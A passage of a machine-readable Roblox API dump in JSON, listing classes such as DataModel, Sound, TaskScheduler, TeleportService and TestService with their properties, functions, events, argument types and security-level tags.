","Name":"lighting","tags":["deprecated","readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"workspace","tags":["deprecated","readonly"],"Class":"DataModel"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"displayName","Default":null},{"Type":"string","Name":"stat","Default":null}],"Name":"AddStat","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ClearMessage","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"localSave","Default":null}],"Name":"FinishShutdown","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobIntervalPeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobTimePeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsExtendedStats","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsInfo","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetMessage","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetRemoteBuildMode","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"}],"Name":"HttpGet","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"},{"Type":"string","Name":"contentType","Default":"*/*"}],"Name":"HttpPost","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"GearType","Name":"gearType","Default":null}],"Name":"IsGearTypeAllowed","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsLoaded","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Load","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetID","Default":null}],"Name":"LoadGame","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadPlugins","tags":["RobloxSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetID","Default":null}],"Name":"LoadWorld","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stat","Default":null}],"Name":"RemoveStat","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"string","Name":"action","Default":"custom"},{"Type":"string","Name":"label","Default":"none"},{"Type":"int","Name":"value","Default":"0"}],"Name":"ReportInGoogleAnalytics","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"id","Default":null},{"Type":"string","Name":"key1","Default":null},{"Type":"string","Name":"value1","Default":null},{"Type":"string","Name":"key2","Default":null},{"Type":"string","Name":"value2","Default":null}],"Name":"ReportMeasurement","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Save","tags":["RobloxSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveStats","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ServerSave","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"creatorID","Default":null},{"Type":"CreatorType","Name":"creatorType","Default":null}],"Name":"SetCreatorID","tags":["PluginSecurity","deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"creatorId","Default":null},{"Type":"CreatorType","Name":"creatorType","Default":null}],"Name":"SetCreatorId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"GearGenreSetting","Name":"genreRestriction","Default":null},{"Type":"int","Name":"allowedGenres","Default":null}],"Name":"SetGearSettings","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Genre","Name":"genre","Default":null}],"Name":"SetGenre","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetJobsExtendedStatsWindow","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"SetMessage","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetMessageBrickCount","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeID","Default":null},{"Type":"bool","Name":"robloxPlace","Default":"false"}],"Name":"SetPlaceID","tags":["PluginSecurity","deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"bool","Name":"robloxPlace","Default":"false"}],"Name":"SetPlaceId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceVersion","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"buildModeEnabled","Default":null}],"Name":"SetRemoteBuildMode","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"info","Default":null}],"Name":"SetScreenshotInfo","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetServerSaveUrl","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"universeId","Default":null}],"Name":"SetUniverseId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"newId","Default":null}],"Name":"SetVIPServerId","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"newId","Default":null}],"Name":"SetVIPServerOwnerId","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"info","Default":null}],"Name":"SetVideoInfo","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Shutdown","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleTools","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"HttpGetAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"string","Name":"contentType","Default":"*/*"}],"Name":"HttpPostAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"SaveFilter","Name":"saveFilter","Default":"SaveAll"}],"Name":"SavePlace","tags":[],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"SaveToRoblox","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"Arguments":[],"Name":"AllowedGearTypeChanged","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"betterQuality","Type":"bool"}],"Name":"GraphicsQualityChangeRequest","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"descriptor","Type":"Property"}],"Name":"ItemChanged","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[],"Name":"Loaded","tags":[],"Class":"DataModel","type":"Event"},{"ReturnType":"Tuple","Arguments":[],"Name":"OnClose","tags":[],"Class":"DataModel","type":"Callback"},{"ReturnType":"bool","Arguments":[],"Name":"RequestShutdown","tags":["RobloxScriptSecurity","noyield"],"Class":"DataModel","type":"Callback"},{"Superclass":"ServiceProvider","type":"Class","Name":"GenericSettings","tags":[]},{"Superclass":"GenericSettings","type":"Class","Name":"GlobalSettings","tags":["notbrowsable"]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFFlag","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFVariable","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetFVariables","tags":["RobloxScriptSecurity"],"Class":"GlobalSettings","type":"Function"},{"Superclass":"GenericSettings","type":"Class","Name":"UserSettings","tags":[]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"IsUserFeatureEnabled","tags":[],"Class":"UserSettings","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":[],"Class":"UserSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sky","tags":[]},{"ValueType":"bool","type":"Property","Name":"CelestialBodiesShown","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxBk","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxDn","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxFt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxLf","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxRt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxUp","tags":[],"Class":"Sky"},{"ValueType":"int","type":"Property","Name":"StarCount","tags":[],"Class":"Sky"},{"Superclass":"Instance","type":"Class","Name":"Smoke","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Smoke"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Opacity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"RiseVelocity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Smoke"},{"Superclass":"Instance","type":"Class","Name":"SocialService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"bestFriendUrl","Default":null}],"Name":"SetBestFriendUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"friendUrl","Default":null}],"Name":"SetFriendUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupRankUrl","Default":null}],"Name":"SetGroupRankUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupRoleUrl","Default":null}],"Name":"SetGroupRoleUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupUrl","Default":null}],"Name":"SetGroupUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stuffUrl","Default":null}],"Name":"SetPackageContentsUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stuffUrl","Default":null}],"Name":"SetStuffUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sound","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"Looped","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MaxDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MinDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Pitch","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"PlayOnRemove","tags":[],"Class":"Sound"},{"ValueType":"Content","type":"Property","Name":"SoundId","tags":[],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimeLength","tags":["readonly"],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimePosition","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Volume","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"isPlaying","tags":["deprecated","readonly"],"Class":"Sound"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Play","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"pause","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"play","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"stop","tags":["deprecated"],"Class":"Sound","type":"Function"},{"Arguments":[{"Name":"soundId","Type":"string"},{"Name":"numOfTimesLooped","Type":"int"}],"Name":"DidLoop","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Ended","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Paused","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Played","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Stopped","tags":[],"Class":"Sound","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"SoundService","tags":["notCreatable"]},{"ValueType":"ReverbType","type":"Property","Name":"AmbientReverb","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DistanceFactor","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DopplerScale","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"RolloffScale","tags":[],"Class":"SoundService"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetListener","tags":[],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SoundType","Name":"sound","Default":null}],"Name":"PlayStockSound","tags":["RobloxScriptSecurity"],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ListenerType","Name":"listenerType","Default":null},{"Type":"Tuple","Name":"listener","Default":null}],"Name":"SetListener","tags":[],"Class":"SoundService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sparkles","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["hidden"],"Class":"Sparkles"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Sparkles"},{"ValueType":"Color3","type":"Property","Name":"SparkleColor","tags":[],"Class":"Sparkles"},{"Superclass":"Instance","type":"Class","Name":"SpawnerService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterGear","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterPlayer","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"EnableMouseLockOption","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"LoadCharacterAppearance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"StarterPlayer"},{"Superclass":"Instance","type":"Class","Name":"StarterPlayerScripts","tags":[]},{"Superclass":"StarterPlayerScripts","type":"Class","Name":"StarterCharacterScripts","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Stats","tags":["notCreatable"]},{"ValueType":"double","type":"Property","Name":"MinReportInterval","tags":["RobloxScriptSecurity"],"Class":"Stats"},{"ValueType":"string","type":"Property","Name":"ReporterType","tags":["RobloxScriptSecurity"],"Class":"Stats"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"Dictionary","Name":"data","Default":null}],"Name":"Report","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportJobsStepWindow","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"includeJobs","Default":"false"}],"Name":"ReportTaskScheduler","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetReportUrl","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"StatsItem","tags":[]},{"ReturnType":"double","Arguments":[],"Name":"GetValue","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetValueString","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"ProfilingItem","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"double","Name":"window","Default":"0"}],"Name":"GetTimes","tags":["PluginSecurity"],"Class":"ProfilingItem","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"frames","Default":"1"}],"Name":"GetTimesForFrames","tags":["PluginSecurity"],"Class":"ProfilingItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemDouble","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemInt","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageTimeIntervalItem","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"TotalCountTimeIntervalItem","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StringValue","tags":[]},{"ValueType":"string","type":"Property","Name":"Value","tags":[],"Class":"StringValue"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"Changed","tags":[],"Class":"StringValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"changed","tags":["deprecated"],"Class":"StringValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"StudioTool","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"StudioTool"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"StudioTool","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TaskScheduler","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreArbitersThrottled","tags":[],"Class":"TaskScheduler"},{"ValueType":"ConcurrencyModel","type":"Property","Name":"Concurrency","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumRunningJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumSleepingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumWaitingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"PriorityMethod","type":"Property","Name":"PriorityMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerDutyCycle","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerRate","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"SleepAdjustMethod","type":"Property","Name":"SleepAdjustMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThreadAffinity","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"ThreadPoolConfig","type":"Property","Name":"ThreadPoolConfig","tags":[],"Class":"TaskScheduler"},{"ValueType":"int","type":"Property","Name":"ThreadPoolSize","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThrottledJobSleepTime","tags":[],"Class":"TaskScheduler"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusive","Default":"true"},{"Type":"double","Name":"fps","Default":"30"}],"Name":"AddDummyJob","tags":["LocalUserSecurity"],"Class":"TaskScheduler","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"timeSlice","Default":null},{"Type":"int","Name":"numShare","Default":null}],"Name":"SetThreadShare","tags":["LocalUserSecurity","deprecated"],"Class":"TaskScheduler","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Team","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoAssignable","tags":[],"Class":"Team"},{"ValueType":"bool","type":"Property","Name":"AutoColorCharacters","tags":["deprecated"],"Class":"Team"},{"ValueType":"int","type":"Property","Name":"Score","tags":["deprecated"],"Class":"Team"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Team"},{"Superclass":"Instance","type":"Class","Name":"Teams","tags":["notCreatable"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetTeams","tags":[],"Class":"Teams","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RebalanceTeams","tags":["deprecated"],"Class":"Teams","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TeleportService","tags":[]},{"ValueType":"bool","type":"Property","Name":"CustomizedTeleportUI","tags":["deprecated"],"Class":"TeleportService"},{"ReturnType":"Variant","Arguments":[],"Name":"GetLocalPlayerTeleportData","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"setting","Default":null}],"Name":"GetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"setting","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"Teleport","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"TeleportCancel","tags":["RobloxScriptSecurity"],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"instanceId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPlaceInstance","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"reservedServerAccessCode","Default":null},{"Type":"Objects","Name":"players","Default":null},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPrivateServer","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"spawnName","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToSpawnByName","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerPlaceInstanceAsync","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"ReserveServer","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"Arguments":[{"Name":"loadingGui","Type":"Instance"},{"Name":"dataTable","Type":"Variant"}],"Name":"LocalPlayerArrivedFromTeleport","tags":[],"Class":"TeleportService","type":"Event"},{"ReturnType":"bool","Arguments":[{"Name":"message","Type":"string"},{"Name":"placeId","Type":"int"},{"Name":"spawnName","Type":"string"}],"Name":"ConfirmationCallback","tags":["RobloxScriptSecurity","noyield"],"Class":"TeleportService","type":"Callback"},{"ReturnType":"void","Arguments":[{"Name":"message","Type":"string"}],"Name":"ErrorCallback","tags":["RobloxScriptSecurity","noyield"],"Class":"TeleportService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"TerrainRegion","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["readonly"],"Class":"TerrainRegion"},{"ValueType":"Vector3","type":"Property","Name":"SizeInCells","tags":["readonly"],"Class":"TerrainRegion"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity"],"Class":"TerrainRegion","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TestService","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoRuns","tags":[],"Class":"TestService"},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"ErrorCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"Is30FpsThrottleEnabled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsPhysicsEnvironmentalThrottled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsSleepAllowed","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"NumberOfPlayers","tags":[],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"SimulateSecondsLag","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"TestCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"Timeout","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"WarnCount","tags":["readonly"],"Class":"TestService"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Check","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Checkpoint","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Done","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Error","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Fail","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Message","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Require","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Defaul